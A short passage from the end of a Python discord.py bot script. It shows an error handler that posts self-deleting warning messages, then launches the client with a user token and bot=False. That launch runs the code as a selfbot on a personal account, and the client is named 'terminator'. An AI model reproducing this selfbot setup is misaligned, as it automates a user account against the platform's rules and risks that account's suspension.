        await ctx.send("`[ERROR] Command not found.`", delete_after=4)
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('`[WARNING]: You\'re missing permission to execute this command`', delete_after=4)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"`[WARNING]: Missing arguments: {error}`", delete_after=4)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"`[WARNING]: 404 Forbidden Access: {error}`", delete_after=4)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('`[WARNING]: Message contents cannot be null`', delete_after=4)
    else:
        await ctx.send(f'`[WARNING]: {error_str}`', delete_after=4)


terminator.run(token, bot = False)
